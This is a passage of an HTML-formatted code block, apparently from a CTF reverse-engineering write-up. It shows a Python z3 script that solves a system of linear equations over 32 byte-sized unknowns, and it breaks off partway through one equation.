class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br><span class="line">1119</span><br><span class="line">1120</span><br><span class="line">1121</span><br><span class="line">1122</span><br><span class="line">1123</span><br><span class="line">1124</span><br><span class="line">1125</span><br><span class="line">1126</span><br><span class="line">1127</span><br><span class="line">1128</span><br><span class="line">1129</span><br><span class="line">1130</span><br><span class="line">1131</span><br><span class="line">1132</span><br><span class="line">1133</span><br><span class="line">1134</span><br><span class="line">1135</span><br><span class="line">1136</span><br><span class="line">1137</span><br><span class="line">1138</span><br><span class="line">1139</span><br><span class="line">1140</span><br><span class="line">1141</span><br><span class="line">1142</span><br><span class="line">1143</span><br><span class="line">1144</span><br><span class="line">1145</span><br><span class="line">1146</span><br><span class="line">1147</span><br><span class="line">1148</span><br><span class="line">1149</span><br><span class="line">1150</span><br><span class="line">1151</span><br><span class="line">1152</span><br><span class="line">1153</span><br><span class="line">1154</span><br><span class="line">1155</span><br><span class="line">1156</span><br><span class="line">1157</span><br><span class="line">1158</span><br><span class="line">1159</span><br><span class="line">1160</span><br><span class="line">1161</span><br><span class="line">1162</span><br><span class="line">1163</span><br><span class="line">1164</span><br><span class="line">1165</span><br><span class="line">1166</span><br><span class="line">1167</span><br><span class="line">1168</span><br><span class="line">1169</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"><span class="keyword">if</span> STEP3:</span><br><span class="line">    <span class="keyword">import</span> z3</span><br><span class="line">    v2 =  z3.Int(<span class="string">&#x27;v2&#x27;</span>)</span><br><span class="line">    v3 =  z3.Int(<span class="string">&#x27;v3&#x27;</span>)</span><br><span class="line">    v4 =  z3.Int(<span class="string">&#x27;v4&#x27;</span>)</span><br><span class="line">    v5 =  z3.Int(<span class="string">&#x27;v5&#x27;</span>)</span><br><span class="line">    v6 =  z3.Int(<span class="string">&#x27;v6&#x27;</span>)</span><br><span class="line">    v7 =  z3.Int(<span class="string">&#x27;v7&#x27;</span>)</span><br><span class="line">    v8 =  z3.Int(<span class="string">&#x27;v8&#x27;</span>)</span><br><span class="line">    v9 =  z3.Int(<span class="string">&#x27;v9&#x27;</span>)</span><br><span class="line">    v10 = z3.Int(<span class="string">&#x27;v10&#x27;</span>)</span><br><span class="line">    v11 = z3.Int(<span class="string">&#x27;v11&#x27;</span>)</span><br><span class="line">    v12 = z3.Int(<span class="string">&#x27;v12&#x27;</span>)</span><br><span class="line">    v13 = z3.Int(<span class="string">&#x27;v13&#x27;</span>)</span><br><span class="line">    v14 = z3.Int(<span class="string">&#x27;v14&#x27;</span>)</span><br><span class="line">    v15 = z3.Int(<span class="string">&#x27;v15&#x27;</span>)</span><br><span class="line">    v16 = z3.Int(<span class="string">&#x27;v16&#x27;</span>)</span><br><span class="line">    v17 = z3.Int(<span class="string">&#x27;v17&#x27;</span>)</span><br><span class="line">    v18 = z3.Int(<span class="string">&#x27;v18&#x27;</span>)</span><br><span class="line">    v19 = z3.Int(<span class="string">&#x27;v19&#x27;</span>)</span><br><span class="line">    v20 = z3.Int(<span class="string">&#x27;v20&#x27;</span>)</span><br><span class="line">    v21 = z3.Int(<span class="string">&#x27;v21&#x27;</span>)</span><br><span class="line">    v22 = z3.Int(<span class="string">&#x27;v22&#x27;</span>)</span><br><span class="line">    v23 = z3.Int(<span class="string">&#x27;v23&#x27;</span>)</span><br><span class="line">    v24 = z3.Int(<span class="string">&#x27;v24&#x27;</span>)</span><br><span class="line">    v25 = z3.Int(<span class="string">&#x27;v25&#x27;</span>)</span><br><span class="line">    v26 = z3.Int(<span class="string">&#x27;v26&#x27;</span>)</span><br><span class="line">    v27 = z3.Int(<span class="string">&#x27;v27&#x27;</span>)</span><br><span class="line">    v28 = z3.Int(<span class="string">&#x27;v28&#x27;</span>)</span><br><span class="line">    v29 = z3.Int(<span class="string">&#x27;v29&#x27;</span>)</span><br><span class="line">    v30 = z3.Int(<span class="string">&#x27;v30&#x27;</span>)</span><br><span class="line">    v31 = z3.Int(<span class="string">&#x27;v31&#x27;</span>)</span><br><span class="line">    v32 = z3.Int(<span class="string">&#x27;v32&#x27;</span>)</span><br><span class="line">    v33 = z3.Int(<span class="string">&#x27;v33&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    s = z3.Solver()</span><br><span class="line"></span><br><span class="line">    s.add(v2&gt;=<span class="number">0</span>,v2&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v3&gt;=<span class="number">0</span>,v3&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v4&gt;=<span class="number">0</span>,v4&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v5&gt;=<span class="number">0</span>,v5&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v6&gt;=<span class="number">0</span>,v6&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v7&gt;=<span class="number">0</span>,v7&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v8&gt;=<span class="number">0</span>,v8&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v9&gt;=<span class="number">0</span>,v9&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v10&gt;=<span class="number">0</span>,v10&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v11&gt;=<span class="number">0</span>,v11&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v12&gt;=<span class="number">0</span>,v12&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v13&gt;=<span class="number">0</span>,v13&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v14&gt;=<span class="number">0</span>,v14&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v15&gt;=<span class="number">0</span>,v15&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v16&gt;=<span class="number">0</span>,v16&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v17&gt;=<span class="number">0</span>,v17&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v18&gt;=<span class="number">0</span>,v18&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v19&gt;=<span class="number">0</span>,v19&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v20&gt;=<span class="number">0</span>,v20&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v21&gt;=<span class="number">0</span>,v21&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v22&gt;=<span class="number">0</span>,v22&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v23&gt;=<span class="number">0</span>,v23&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v24&gt;=<span class="number">0</span>,v24&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v25&gt;=<span class="number">0</span>,v25&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v26&gt;=<span class="number">0</span>,v26&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v27&gt;=<span class="number">0</span>,v27&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v28&gt;=<span class="number">0</span>,v28&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v29&gt;=<span class="number">0</span>,v29&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v30&gt;=<span class="number">0</span>,v30&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v31&gt;=<span class="number">0</span>,v31&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v32&gt;=<span class="number">0</span>,v32&lt;=<span class="number">0xff</span>)</span><br><span class="line">    s.add(v33&gt;=<span class="number">0</span>,v33&lt;=<span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line">    s.add(<span class="number">45</span> * v33</span><br><span class="line">         + <span class="number">248</span> * v32</span><br><span class="line">         + <span class="number">20</span> * v31</span><br><span class="line">         + <span class="number">67</span> * v30</span><br><span class="line">         + <span class="number">90</span> * v29</span><br><span class="line">         + <span class="number">135</span> * v28</span><br><span class="line">         + <span class="number">106</span> * v27</span><br><span class="line">         + <span class="number">112</span> * v26</span><br><span class="line">         + <span class="number">40</span> * v25</span><br><span class="line">         + <span class="number">231</span> * v24</span><br><span class="line">         + <span class="number">153</span> * v23</span><br><span class="line">         + <span class="number">233</span> * v22</span><br><span class="line">         + <span class="number">19</span> * v21</span><br><span class="line">         + <span class="number">188</span> * v20</span><br><span class="line">         + <span class="number">232</span> * v19</span><br><span class="line">         + <span class="number">127</span> * v18</span><br><span class="line">         + <span class="number">15</span> * v17</span><br><span class="line">         + <span class="number">67</span> * v16</span><br><span class="line">         + <span class="number">50</span> * v15</span><br><span class="line">         + <span class="number">161</span> * v14</span><br><span class="line">         + <span class="number">103</span> * v13</span><br><span class="line">         + <span class="number">144</span> * v12</span><br><span class="line">         + <span class="number">81</span> * v11</span><br><span class="line">         + <span class="number">126</span> * v10</span><br><span class="line">         + <span class="number">240</span> * v9</span><br><span class="line">         + <span class="number">124</span> * v8</span><br><span class="line">         + <span class="number">194</span> * v7</span><br><span class="line">         + <span class="number">92</span> * v6</span><br><span class="line">         + <span class="number">108</span> * v5</span><br><span class="line">         + <span class="number">111</span> * v4</span><br><span class="line">         + <span class="number">174</span> * v3</span><br><span class="line">         + <span class="number">48</span> * v2 == <span class="number">359512</span>)</span><br><span class="line"></span><br><span class="line">    s.add(<span class="number">131</span> * v33</span><br><span class="line">         + <span class="number">120</span> * v32</span><br><span class="line">         + <span class="number">149</span> * v31</span><br><span class="line">         + <span class="number">244</span> * v30</span><br><span class="line">         + <span class="number">56</span> * v29</span><br><span class="line">         + <span class="number">154</span> * v28</span><br><span class="line">         + <span class="number">156</span> * v27</span><br><span class="line">         + <span class="number">94</span> * v26</span><br><span class="line">         + <span class="number">169</span> * v25</span><br><span class="line">         + <span class="number">32</span> * v24</span><br><span class="line">         + <span class="number">209</span> * v23</span><br><span class="line">         + <span class="number">225</span> * v22</span><br><span class="line">         + <span class="number">26</span> * v21</span><br><span class="line">         + <span class="number">178</span> * v20</span><br><span class="line">         + <span class="number">90</span> * v19</span><br><span class="line">         + <span class="number">104</span> * v18</span><br><span class="line">         + <span class="number">212</span> * v17</span><br><span class="line">         + <span class="number">17</span> * v16</span><br><span class="line">         + <span class="number">180</span> * v15</span><br><span class="line">         + <span class="number">40</span> * v14</span><br><span class="line">         + <span class="number">194</span> * v13</span><br><span class="line">         + <span class="number">148</span> * v12</span><br><span class="line">         + <span class="number">171</span> * v11</span><br><span class="line">         + <span class="number">186</span> * v10</span><br><span class="line">         + <span class="number">248</span> * v9</span><br><span class="line">         + <span class="number">10</span> * v8</span><br><span class="line">         + <span class="number">81</span> * v7</span><br><span class="line">         + <span class="number">195</span> * v6</span><br><span class="line">         + <span class="number">227</span> * v5</span><br><span class="line">         + <span class="number">78</span> * v4</span><br><span class="line">         + <span class="number">101</span> * v3</span><br><span class="line">         + <span class="number">13</span> * v2 == <span class="number">387514</span>)</span><br><span class="line"></span><br><span class="line">    s.add(<span class="number">145</span> * v33</span><br><span class="line">         + <span class="number">136</span> * v32</span><br><span class="line">         + <span class="number">188</span> * v31</span><br><span class="line">         + <span class="number">117</span> * v30</span><br><span class="line">         + <span class="number">60</span> * v29</span><br><span class="line">         + <span class="number">202</span> * v28</span><br><span class="line">         + <span class="number">14</span> * v27</span><br><span class="line">         + <span class="number">38</span> * v26</span><br><span class="line">         + <span class="number">197</span> * v25</span><br><span class="line">         + <span class="number">174</span> * v24</span><br><span class="line">         + <span class="number">9</span> * v23</span><br><span class="line">         + <span class="number">112</span> * v22</span><br><span class="line">         + <span class="number">251</span> * (v15 + v20)</span><br><span class="line">         + <span class="number">86</span> * v21</span><br><span class="line">         + <span class="number">154</span> * v19</span><br><span class="line">         + <span class="number">40</span> * v18</span><br><span class="line">         + <span class="number">248</span> * v17</span><br><span class="line">         + <span class="number">8</span> * v16</span><br><span class="line">         + <span class="number">69</span> * v14</span><br><span class="line">         + <span class="number">109</span> * v13</span><br><span class="line">         + <span class="number">67</span> * v12</span><br><span class="line">         + <span class="number">36</span> * v11</span><br><span class="line">         + <span class="number">46</span> * v10</span><br><span class="line">         + <span class="number">55</span> * v9</span><br><span class="line">         + <span class="number">30</span> * v8</span><br><span class="line">         + <span class="number">131</span> * v7</span><br><span class="line">         + <span class="number">95</span> * v6</span><br><span class="line">         + <span class="number">83</span> * v5</span><br><span class="line">         + <span class="number">44</span> * v4</span><br><span class="line">         + <span class="number">53</span> * v3</span><br><span class="line">         + <span class="number">240</span> * v2 == <span class="number">301487</span>)</span><br><span class="line"></span><br><span class="line">    s.add(<span class="number">155</span> * v32</span><br><span class="line">         + <span class="number">48</span> * v31</span><br><span class="line">         + <span class="number">35</span> * v30</span><br><span class="line">         + <span class="number">116</span> * v29</span><br><span class="line">         + <span class="number">140</span> * v28</span><br><span class="line">         + <span class="number">105</span> * v27</span><br><span class="line">         + <span class="number">65</span> * v26</span><br><span class="line">         + <span class="number">45</span> * v25</span><br><span class="line">         + <span class="number">192</span> * v24</span><br><span class="line">         + <span class="number">33</span> * v23</span><br><span class="line">         + <span class="number">113</span> * v22</span><br><span class="line">         + <span class="number">110</span> * v20</span><br><span class="line">         + <span class="number">109</span> * v19</span><br><span class="line">         + <span class="number">165</span> * v18</span><br><span class="line">         + <span class="number">5</span> * v17</span><br><span class="line">         + <span class="number">148</span> * v16</span><br><span class="line">         + <span class="number">127</span> * v15</span><br><span class="line">         + <span class="number">145</span> * v14</span><br><span class="line">         + <span class="number">7</span> * v13</span><br><span class="line">         + <span class="number">30</span> * v12</span><br><span class="line">         + <span class="number">139</span> * v11</span><br><span class="line">         + <span class="number">10</span> * v10</span><br><span class="line">         + <span class="number">182</span> * v9</span><br><span class="line">         + <span class="number">102</span> * v8</span><br><span class="line">         + <span class="number">57</span> * v7</span><br><span class="line">         + <span class="number">112</span> * v6</span><br><span class="line">         + <span class="number">152</span> * v5</span><br><span class="line">         + <span class="number">162</span> * v4</span><br><span class="line">         + <span class="number">25</span> * (v33 + v3)</span><br><span class="line">         + <span class="number">234</span> * (v21 + v2) == <span class="number">296549</span>)</span><br><span class="line"></span><br><span class="line">    s.add(<span class="number">46</span> * v33</span><br><span class="line">         + <span class="number">209</span> * v32</span><br><span class="line">         + <span class="number">97</span> * v31</span><br><span class="line">         + <span class="number">10</span> * v30</span><br><span class="line">         + <span class="number">151</span> * v29</span><br><span class="line">         + <span class="number">139</span> * v28</span><br><span class="line">         + <span class="number">90</span> * v27</span><br><span class="line">         + <span class="number">156</span> * v26</span><br><span class="line">         + <span class="number">29</span> * v25</span><br><span class="line">         + <span class="number">210</span> * v24</span><br><span class="line">         + <span class="number">34</span> * v23</span><br><span class="line">         + <span class="number">76</span> * v22</span><br><span class="line">         + <span class="number">108</span> * (v12 + v20)</span><br><span class="line">         + <span class="number">107</span> * v21</span><br><span class="line">         + <span class="number">241</span> * v19</span><br><span class="line">         + <span class="number">88</span> * v18</span><br><span class="line">         + <span class="number">164</span> * v17</span><br><span class="line">         + <span class="number">39</span> * v16</span><br><span class="line">         + <span class="number">130</span> * v15</span><br><span class="line">         + <span class="number">45</span> * v14</span><br><span class="line">         + <span class="number">104</span> * v13</span><br><span class="line">         + <span class="number">7</span> * v11</span><br><span class="line">         + <span class="number">197</span> * v10</span><br><span class="line">         + <span class="number">148</span> * v9</span><br><span class="line">         + <span class="number">141</span> * v8</span><br><span class="line">         + <span class="number">118</span> * v7</span><br><span class="line">         + <span class="number">236</span> * v6</span><br><span class="line">         + <span class="number">101</span> * v5</span><br><span class="line">         + <span class="number">189</span> * v4</span><br><span class="line">         + <span class="number">113</span> * v3</span><br><span class="line">         + <span class="number">82</span> * v2 == <span class="number">344514</span>)</span><br><span class="line"></span><br><span class="line">    s.add(<span class="number">7</span> * v33</span><br><span class="line">         + <span class="number">98</span> * v32</span><br><span class="line">         + <span class="number">90</span> * v31</span><br><span class="line">         + <span class="number">49</span> * v30</span><br><span class="line">         + <span class="number">25</span> * v29</span><br><span class="line">         + <span class="number">151</span> * v28</span><br><span class="line">         + <span class="number">120</span> * v27</span><br><span class="line">         + <span class="number">153</span> * v26</span><br><span class="line">         + <span class="number">117</span> * v25</span><br><span class="line">         + <span class="number">139</span> * v24</span><br><span class="line">         + <span class="number">240</span> * v23</span><br><span class="line">         + <span class="number">96</span> * v22</span><br><span class="line">         + <span class="number">111</span> * v21</span><br><span class="line">         + <span class="number">26</span> * v19</span><br><span class="line">         + <span class="number">203</span> * v18</span><br><span class="line">         + <span class="number">105</span> * v17</span><br><span class="line">         + <span class="number">115</span> * v16</span><br><span class="line">         + <span class="number">176</span> * v15</span><br><span class="line">         + <span class="number">38</span> * v14</span><br><span class="line">         + <span class="number">163</span> * v13</span><br><span class="line">         + <span class="number">237</span> * v12</span><br><span class="line">         + <span class="number">225</span> * v11</span><br><span class="line">         + <span class="number">3</span> * v10</span><br><span class="line">         + <span class="number">230</span> * v9</span><br><span class="line">         + <span class="number">155</span> * v8</span><br><span class="line">         + <span class="number">102</span> * v7</span><br><span class="line">         + <span class="number">50</span> * v6</span><br><span class="line">         + <span class="number">182</span> * v5</span><br><span class="line">         + <span class="number">13</span> * v4</span><br><span class="line">         + <span class="number">72</span> * (v20 + v3)</span><br><span class="line">         + <span class="number">179</span> * v2 == <span class="number">346892</span>)</span><br><span class="line"></span><br><span class="line">    s.add(<span class="number">97</span> * v33</span><br><span class="line">         + <span class="number">13</span> * v32</span><br><span class="line">         + <span class="number">254</span> * v31</span><br><span class="line">         + <span class="number">129</span> * v30</span><br><span class="line">         + <span class="number">99</span> * v29</span><br><span class="line">         + <span class="number">74</span> * v28</span><br><span class="line">         + <span class="number">22</span> * v27</span><br><span class="line">         + <span class="number">187</span> * (v14 + v25)</span><br><span class="line">         + <span class="number">214</span> * v26    + v24</span><br><span class="line">         + <span class="number">174</span> * v23</span><br><span class="line">         + <span class="number">225</span> * v22</span><br><span class="line">         + <span class="number">67</span> * v21</span><br><span class="line">         + <span class="number">65</span> * v20</span><br><span class="line">         + <span class="number">39</span> * v19</span><br><span class="line">         + <span class="number">252</span> * v18</span><br><span class="line">         + <span class="number">186</span> * v17</span><br><span class="line">         + <span class="number">226</span> * (v6 + v16)</span><br><span class="line">         + <span class="number">100</span> * v15</span><br><span class="line">         + <span class="number">209</span> * v13</span><br><span class="line">         + <span class="number">203</span> * v12</span><br><span class="line">         + <span class="number">101</span> * (v7 + v11)</span><br><span class="line">         + <span class="number">127</span> * v10</span><br><span class="line">         + <span class="number">99</span> * v9</span><br><span class="line">         + <span class="number">110</span> * v8</span><br><span class="line">         + <span class="number">170</span> * v5</span><br><span class="line">         + <span class="number">150</span> * v4</span><br><span class="line">         + <span class="number">61</span> * v3</span><br><span class="line">         + <span class="number">156</span> * v2 == <span class="number">386678</span>)</span><br><span class="line"></span><br><span class="line">    s.add(<span class="number">94</span> * v33</span><br><span class="line">         + <span class="number">77</span> * v32</span><br><span class="line">         + <span class="number">19</span> * v31</span><br><span class="line">         + <span class="number">220</span> * v30</span><br><span class="line">         + <span class="number">134</span> * v29</span><br><span class="line">         + <span class="number">156</span> * v28</span><br><span class="line">         + <span class="number">62</span> * v27</span><br><span class="line">         + <span class="number">106</span> * v26</span><br><span class="line">         + <span class="number">72</span> * v25</span><br><span class="line">         + <span class="number">139</span> * v24</span><br><span class="line">         + <span class="number">171</span> * v23</span><br><span class="line">         + <span class="number">73</span> * v22</span><br><span class="line">         + <span class="number">22</span> * v21</span><br><span class="line">         + <span class="number">81</span> * v20</span><br><span class="line">         + <span class="number">218</span> * v19</span><br><span class="line">         + <span class="number">240</span> * v18</span><br><span class="line">         + <span class="number">242</span> * v17</span><br><span class="line">         +v16</span><br><span class="line">         + <span class="number">48</span> * v15</span><br><span class="line">         + <span class="number">32</span> * v14</span><br><span class="line">         + <span class="number">222</span> * v13</span><br><span class="line">         + <span class="number">185</span> * v12</span><br><span class="line">         + <span class="number">177</span> * v11</span><br><span class="line">         + <span class="number">133</span> * v10</span><br><span class="line">         + <span class="number">252</span> * v9</span><br><span class="line">         + <span class="number">60</span> * v8</span><br><span class="line">         + <span class="number">232</span> * v7</span><br><span class="line">         + <span class="number">118</span> * v6</span><br><span class="line">         +v5</span><br><span class="line">         + <span class="number">88</span> * v4</span><br><span class="line">         + <span class="number">117</span> * v3</span><br><span class="line">         + <span class="number">154</span> * v2 == <span class="number">348667</span>)</span><br><span class="line"></span><br><span class="line">    s.add(<span class="number">70</span> * v33</span><br><span class="line">         + <span class="number">162</span> * v32</span><br><span class="line">         + <span class="number">242</span> * v31</span><br><span class="line">         + <span class="number">19</span> * v30</span><br><span class="line">         + <span class="number">38</span> * v29</span><br><span class="line">         + <span class="number">111</span> * v28</span><br><span class="line">         + <span class="number">29</span> * v27</span><br><span class="line">         + <span class="number">48</span> * v26</span><br><span class="line">         + <span class="number">52</span> * v25</span><br><span class="line">         + <span class="number">131</span> * v24</span><br><span class="line">         + <span class="number">122</span> * v23</span><br><span class="line">         + <span class="number">43</span> * v22</span><br><span class="line">         + <span class="number">247</span> * v21</span><br><span class="line">         + <span class="number">91</span> * v20</span><br><span class="line">         + <span class="number">143</span> * v19</span><br><span class="line">         + <span class="number">228</span> * v18</span><br><span class="line">         + <span class="number">130</span> * v17</span><br><span class="line">         + <span class="number">211</span> * v16</span><br><span class="line">         + <span class="number">96</span> * v15</span><br><span class="line">         + <span class="number">117</span> * v14</span><br><span class="line">         + <span class="number">7</span> * v13</span><br><span class="line">         + <span class="number">95</span> * v12</span><br><span class="line">         + <span class="number">75</span> * v11</span><br><span class="line">         + <span class="number">75</span> * v10</span><br><span class="line">         + <span class="number">232</span> * v9</span><br><span class="line">         + <span class="number">26</span> * v8</span><br><span class="line">         + <span class="number">39</span> * v7</span><br><span class="line">         + <span class="number">41</span> * v6</span><br><span class="line">         + <span class="number">189</span> * v5</span><br><span class="line">         + <span class="number">173</span> * v4</span><br><span class="line">         + <span class="number">151</span> * v3</span><br><span class="line">         + <span class="number">220</span> * v2 == <span class="number">316884</span>)</span><br><span class="line"></span><br><span class="line">    s.add(<span class="number">112</span> * v33</span><br><span class="line">         + <span class="number">14</span> * v32</span><br><span class="line">         + <span class="number">160</span> * v31</span><br><span class="line">         + <span class="number">150</span> * v30</span><br><span class="line">         + <span class="number">5</span> * v29</span><br><span class="line">         + <span class="number">189</span> * v28</span><br><span class="line">         + <span class="number">33</span> * v27</span><br><span class="line">         + <span class="number">77</span> * v26</span><br><span class="line">         + <span class="number">226</span> * v25</span><br><span class="line">         + <span class="number">126</span> * v24</span><br><span class="line">         + <span class="number">143</span> * v23</span><br><span class="line">         + <span class="number">244</span> * v22</span><br><span class="line">         + <span class="number">119</span> * v21</span><br><span class="line">         + <span class="number">233</span> * v20</span><br><span class="line">         + <span class="number">18</span> * v19</span><br><span class="line">         + <span class="number">214</span> * v18</span><br><span class="line">         + <span class="number">120</span> * v17</span><br><span class="line">         + <span class="number">174</span> * v16</span><br><span class="line">         + <span class="number">20</span> * v15</span><br><span class="line">         + <span class="number">165</span> * v14</span><br><span class="line">         + <span class="number">233</span> * v13</span><br><span class="line">         + <span class="number">38</span> * v12</span><br><span class="line">         + <span class="number">25</span> * v11</span><br><span class="line">         + <span class="number">220</span> * v10</span><br><span class="line">         + <span class="number">204</span> * v9</span><br><span class="line">         + <span class="number">79</span> * v8</span><br><span class="line">         + <span class="number">104</span> * v7</span><br><span class="line">         + <span class="number">147</span> * v6</span><br><span class="line">         + <span class="number">236</span> * v5</span><br><span class="line">         + <span class="number">136</span> * v4</span><br><span class="line">         + <span class="number">92</span> * v3</span><br><span class="line">         + <span class="number">231</span> * v2 ==<span class="number">372620</span>)</span><br><span class="line"></span><br><span class="line">    s.add(  <span class="number">88</span> * v33</span><br><span class="line">           + <span class="number">192</span> * v32</span><br><span class="line">           + <span class="number">135</span> * v31</span><br><span class="line">           + <span class="number">98</span> * v30</span><br><span class="line">           + <span class="number">109</span> * v29</span><br><span class="line">           + <span class="number">97</span> * v28</span><br><span class="line">           + <span class="number">187</span> * v27</span><br><span class="line">           + <span class="number">184</span> * v26</span><br><span class="line">           + <span class="number">252</span> * v25</span><br><span class="line">           + <span class="number">2</span> * (v21 + v23)</span><br><span class="line">           + <span class="number">216</span> * v24</span><br><span class="line">           + <span class="number">167</span> * v22</span><br><span class="line">           + <span class="number">199</span> * v20</span><br><span class="line">           + <span class="number">170</span> * v19</span><br><span class="line">           + <span class="number">64</span>*  v18</span><br><span class="line">           + <span class="number">165</span> * v17</span><br><span class="line">           + <span class="number">129</span> * v16</span><br><span class="line">           + <span class="number">163</span> * v15</span><br><span class="line">           + <span class="number">171</span> * v14</span><br><span class="line">           + <span class="number">172</span> * v13</span><br><span class="line">           + <span class="number">183</span> * v12</span><br><span class="line">           + <span class="number">94</span> * v11</span><br><span class="line">           + <span class="number">39</span> * v10</span><br><span class="line">           + <span class="number">175</span> * v9</span><br><span class="line">           + <span class="number">212</span> * v8</span><br><span class="line">           + <span class="number">250</span> * v7</span><br><span class="line">           + <span class="number">193</span> * v6</span><br><span class="line">           + <span class="number">191</span> * v5</span><br><span class="line">           + <span class="number">38</span> * v4</span><br><span class="line">           + <span class="number">203</span> * v3</span><br><span class="line">           + <span class="number">50</span> * v2 == <span class="number">413102</span>)</span><br><span class="line"></span><br><span class="line">    s.add(<span class="number">16</span> * v33</span><br><span class="line">           + <span class="number">136</span> * v32</span><br><span class="line">           + <span class="number">147</span> * v31</span><br><span 